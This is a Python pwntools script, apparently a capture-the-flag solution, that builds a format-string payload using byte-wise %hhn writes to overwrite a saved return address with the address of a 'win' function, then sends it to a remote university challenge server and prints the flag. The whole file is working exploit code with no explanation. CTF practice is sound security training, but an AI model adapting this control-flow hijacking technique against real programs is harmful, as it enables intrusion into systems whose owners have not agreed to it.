#!/usr/bin/env python
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 10098

e = ELF("bin")
SYM = e.symbols["win"]

EIP = 0xFFFFCF8C
BUF = 0xFFFFCEFC
TRGBUF = 0xFFFFDC5C
TRGEIP = EIP + (TRGBUF - BUF)

PTR = [p32(TRGEIP + i) for i in range(4)]
POS = [(7 + i) for i in range(4)]
PADD = [((SYM >> (8 * i)) & 0xFF) for i in range(4)]

DATA = ""
for p in PTR:
	DATA += p

PADD[3] += 256 - PADD[2]
PADD[2] += 256 - PADD[1]
PADD[1] += 256 - PADD[0]
PADD[0] += 256 - len(DATA)

for p in zip(PADD, POS):
	DATA += "%{}x".format(p[0]) + "%{}$hhn".format(p[1])

s = remote(SERVER, PORT)
s.sendline(DATA)
print(s.recvuntil('}'))
s.close()
